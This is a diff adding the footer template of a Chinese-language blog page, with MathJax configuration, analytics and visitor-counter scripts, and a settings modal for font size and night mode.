+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            SCS
+          </div>
+          <div class="panel-body">
+            Copyright © 2022 Janson Woods All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
